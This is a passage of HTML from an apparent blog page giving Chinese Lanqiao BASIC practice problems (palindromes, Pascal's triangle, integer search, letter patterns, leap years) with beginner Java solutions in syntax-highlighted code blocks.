class="number">0</span>;m &lt; intArr.length;m++)&#123;</span><br><span class="line">            intArr[m] = Integer.parseInt(strArr[m]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 排序</span></span><br><span class="line">        Arrays.sort(intArr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; intArr.length;i++)&#123;</span><br><span class="line">            System.out.println(intArr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-8-回文数"><a href="#BASIC-8-回文数" class="headerlink" title="BASIC-8 回文数"></a>BASIC-8 回文数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　1221是一个非常特殊的数，它从左边读和从右边读是一样的，编程求所有这样的四位十进制数。</span><br><span class="line">输出格式</span><br><span class="line">　　按从小到大的顺序输出满足条件的四位十进制数。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line">        StringBuffer str = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; <span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">10</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>;k &lt; <span class="number">10</span>;k++)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> n = <span class="number">0</span>;n &lt; <span class="number">10</span>;n++)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(i==n &amp;&amp; j==k)&#123;</span><br><span class="line">                            str.append(i*<span class="number">1000</span>+j*<span class="number">100</span>+k*<span class="number">10</span>+n);</span><br><span class="line">                            str.append(<span class="string">","</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String[] strArr = str.toString().split(<span class="string">","</span>);</span><br><span class="line">        <span class="keyword">int</span>[] intArr = <span class="keyword">new</span> <span class="keyword">int</span>[strArr.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> m = <span class="number">0</span>;m &lt; intArr.length;m++)&#123;</span><br><span class="line">            intArr[m] = Integer.parseInt(strArr[m]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Arrays.sort(intArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; intArr.length;i++)&#123;</span><br><span class="line">            System.out.println(intArr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-7-特殊的数字"><a href="#BASIC-7-特殊的数字" class="headerlink" title="BASIC-7 特殊的数字"></a>BASIC-7 特殊的数字</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">　　153是一个非常特殊的数，它等于它的每位数字的立方和，即153=1*1*1+5*5*5+3*3*3。编程求所有满足这种条件的三位十进制数。</span><br><span class="line">输出格式</span><br><span class="line">　　按从小到大的顺序输出满足条件的三位十进制数，每个数占一行。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        StringBuffer str = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; <span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">10</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> m = <span class="number">0</span>;m &lt; <span class="number">10</span>;m++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>((i*<span class="number">100</span> + j*<span class="number">10</span> + m) == (i*i*i+j*j*j+m*m*m))&#123;</span><br><span class="line">                        str.append(i*<span class="number">100</span> + j*<span class="number">10</span> + m);</span><br><span class="line">                        str.append(<span class="string">","</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String[] strArr = str.toString().split(<span class="string">","</span>);</span><br><span class="line">        <span class="keyword">int</span>[] intArr = <span class="keyword">new</span> <span class="keyword">int</span>[strArr.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; intArr.length;i++)&#123;</span><br><span class="line">            intArr[i] = Integer.parseInt(strArr[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Arrays.sort(intArr);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; intArr.length;j++)&#123;</span><br><span class="line">            System.out.println(intArr[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-6-杨辉三角形"><a href="#BASIC-6-杨辉三角形" class="headerlink" title="BASIC-6 杨辉三角形"></a>BASIC-6 杨辉三角形</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">杨辉三角形又称Pascal三角形，它的第i+1行是(a+b)i的展开式的系数。</span><br><span class="line"></span><br><span class="line">　　</span><br><span class="line">它的一个重要性质是：三角形中的每个数字等于它两肩上的数字相加。</span><br><span class="line"></span><br><span class="line">　　</span><br><span class="line">下面给出了杨辉三角形的前4行：</span><br><span class="line"></span><br><span class="line">　　</span><br><span class="line">   1</span><br><span class="line"></span><br><span class="line">　　</span><br><span class="line">  1 1</span><br><span class="line"></span><br><span class="line">　　</span><br><span class="line"> 1 2 1</span><br><span class="line"></span><br><span class="line">　　</span><br><span class="line">1 3 3 1</span><br><span class="line"></span><br><span class="line">　　</span><br><span class="line">给出n，输出它的前n行。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">输入包含一个数n。</span><br><span class="line"></span><br><span class="line">输出格式</span><br><span class="line">输出杨辉三角形的前n行。每一行从这一行的第一个数开始依次输出，中间使用一个空格分隔。请不要在前面输出多余的空格。</span><br><span class="line">样例输入</span><br><span class="line">4</span><br><span class="line">样例输出</span><br><span class="line">1</span><br><span class="line">1 1</span><br><span class="line">1 2 1</span><br><span class="line">1 3 3 1</span><br><span class="line">数据规模与约定</span><br><span class="line">1 &lt;= n &lt;= 34。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span>[][] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">35</span>][<span class="number">35</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将最左边的一列全赋值为1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">            arr[i][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算出从2-n 列的值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>;i &lt;= n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">2</span>;j &lt;= i;j++)&#123;</span><br><span class="line">                arr[i][j] = arr[i-<span class="number">1</span>][j-<span class="number">1</span>]+arr[i-<span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>;j &lt;= n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[i][j]!=<span class="number">0</span>)&#123;</span><br><span class="line">                    System.out.print(arr[i][j]+<span class="string">" "</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-5-查找整数"><a href="#BASIC-5-查找整数" class="headerlink" title="BASIC-5 查找整数"></a>BASIC-5 查找整数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">给出一个包含n个整数的数列，问整数a在数列中的第一次出现是第几个。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">第一行包含一个整数n。</span><br><span class="line"></span><br><span class="line">第二行包含n个非负整数，为给定的数列，数列中的每个数都不大于10000。</span><br><span class="line"></span><br><span class="line">第三行包含一个整数a，为待查找的数。</span><br><span class="line"></span><br><span class="line">输出格式</span><br><span class="line">如果a在数列中出现了，输出它第一次出现的位置(位置从1开始编号)，否则输出-1。</span><br><span class="line">样例输入</span><br><span class="line">6</span><br><span class="line">1 9 4 8 3 9</span><br><span class="line">9</span><br><span class="line">样例输出</span><br><span class="line">2</span><br><span class="line">数据规模与约定</span><br><span class="line">1 &lt;= n &lt;= 1000。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">            arr[i] = in.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> search = in.nextInt();</span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[j] == search)&#123;</span><br><span class="line">                flag = <span class="keyword">true</span>;</span><br><span class="line">                System.out.println(j+<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">            System.out.println(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-4-数列特征"><a href="#BASIC-4-数列特征" class="headerlink" title="BASIC-4 数列特征"></a>BASIC-4 数列特征</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">给出n个数，找出这n个数的最大值，最小值，和。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">第一行为整数n，表示数的个数。</span><br><span class="line"></span><br><span class="line">第二行有n个数，为给定的n个数，每个数的绝对值都小于10000。</span><br><span class="line"></span><br><span class="line">输出格式</span><br><span class="line">输出三行，每行一个整数。第一行表示这些数中的最大值，第二行表示这些数中的最小值，第三行表示这些数的和。</span><br><span class="line">样例输入</span><br><span class="line">5</span><br><span class="line">1 3 -2 4 5</span><br><span class="line">样例输出</span><br><span class="line">5</span><br><span class="line">-2</span><br><span class="line">11</span><br><span class="line">数据规模与约定</span><br><span class="line">1 &lt;= n &lt;= 10000。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> n = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">            arr[i] = in.nextInt();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> max = arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> min = arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">            sum += arr[i];</span><br><span class="line">            <span class="keyword">if</span>(max &lt; arr[i])&#123;</span><br><span class="line">                max = arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(min &gt; arr[i])&#123;</span><br><span class="line">                min = arr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(max);</span><br><span class="line">        System.out.println(min);</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-3-字母图形"><a href="#BASIC-3-字母图形" class="headerlink" title="BASIC-3 字母图形"></a>BASIC-3 字母图形</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">利用字母可以组成一些美丽的图形，下面给出了一个例子：</span><br><span class="line"></span><br><span class="line">ABCDEFG</span><br><span class="line"></span><br><span class="line">BABCDEF</span><br><span class="line"></span><br><span class="line">CBABCDE</span><br><span class="line"></span><br><span class="line">DCBABCD</span><br><span class="line"></span><br><span class="line">EDCBABC</span><br><span class="line"></span><br><span class="line">这是一个5行7列的图形，请找出这个图形的规律，并输出一个n行m列的图形。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">输入一行，包含两个整数n和m，分别表示你要输出的图形的行数的列数。</span><br><span class="line">输出格式</span><br><span class="line">输出n行，每个m个字符，为你的图形。</span><br><span class="line">样例输入</span><br><span class="line">5 7</span><br><span class="line">样例输出</span><br><span class="line">ABCDEFG</span><br><span class="line">BABCDEF</span><br><span class="line">CBABCDE</span><br><span class="line">DCBABCD</span><br><span class="line">EDCBABC</span><br><span class="line">数据规模与约定</span><br><span class="line">1 &lt;= n, m &lt;= 26。</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> row = in.nextInt();</span><br><span class="line">        <span class="keyword">int</span> columns = in.nextInt();</span><br><span class="line">        String str = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">        <span class="keyword">char</span>[] chr = str.toCharArray();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; row;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; columns) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k = i;k &gt; <span class="number">0</span>;k--)&#123;</span><br><span class="line">                    System.out.print(chr[k]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k = i;k &gt;= i-columns+<span class="number">1</span>;k--)&#123;</span><br><span class="line">                    System.out.print(chr[k]);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; columns-i ;j++)&#123;</span><br><span class="line">                System.out.print(chr[j]);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">""</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-2-01字串"><a href="#BASIC-2-01字串" class="headerlink" title="BASIC-2 01字串"></a>BASIC-2 01字串</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">问题描述</span><br><span class="line">对于长度为5位的一个01串，每一位都可能是0或1，一共有32种可能。它们的前几个是：</span><br><span class="line"></span><br><span class="line">00000</span><br><span class="line"></span><br><span class="line">00001</span><br><span class="line"></span><br><span class="line">00010</span><br><span class="line"></span><br><span class="line">00011</span><br><span class="line"></span><br><span class="line">00100</span><br><span class="line"></span><br><span class="line">请按从小到大的顺序输出这32种01串。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">本试题没有输入。</span><br><span class="line">输出格式</span><br><span class="line">输出32行，按从小到大的顺序每行一个长度为5的01串。</span><br><span class="line">样例输出</span><br><span class="line">00000</span><br><span class="line">00001</span><br><span class="line">00010</span><br><span class="line">00011</span><br><span class="line">&lt;以下部分省略&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">32</span>;i++)&#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * Long.parseLong(str)  Integer.parseInt(str)  将字符串转成数字</span></span><br><span class="line"><span class="comment">             * String.valueOf(num)  将数字转字符串</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            System.out.println(String.format(<span class="string">"%05d"</span>,Long.parseLong(Long.toBinaryString(i))));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BASIC-1-闰年判断"><a href="#BASIC-1-闰年判断" class="headerlink" title="BASIC-1 闰年判断"></a>BASIC-1 闰年判断</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 